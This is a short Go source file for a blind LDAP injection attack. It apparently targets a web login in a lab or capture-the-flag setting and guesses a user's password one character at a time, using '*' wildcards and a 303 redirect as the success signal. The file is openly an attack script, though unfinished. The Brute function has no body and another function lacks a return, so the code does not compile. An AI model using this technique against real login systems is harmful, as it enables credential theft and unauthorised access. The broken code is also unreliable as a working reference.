package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type LdapInjector struct {
	Url      string
	Username string
	Charset  string
}

func NewLdapInjector(url, username string) *LdapInjector {
	return &LdapInjector{
		Url:      url,
		Username: username,
		Charset:  CreateCharset(),
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{}, "$K1"]`, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, nil
	}
	req.Header.Set("Content-Type", "Application/x-www-form-urlencoded")
	req.Header.Set("Next-Action", "<hash>")

	// Do not follow Redirect
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, nil
	}
	defer resp.Body.Close()

	return resp.StatusCode == 303, nil
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c)))
		if err != nil {
			return "", err
		}
		if ok {
			return string(c), nil
		}
	}
}
func (li *LdapInjector) Brute() (string, error)

func CreateCharset() string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i := range 10 {
		c := strconv.Itoa(i)
		charset += string(c)
	}
	return charset
}

func main() {
	//c := NewLdapInjector("ldap://<ip>:<port>/login", "gitea_temp_principal")
	fmt.Println(CreateCharset())
}
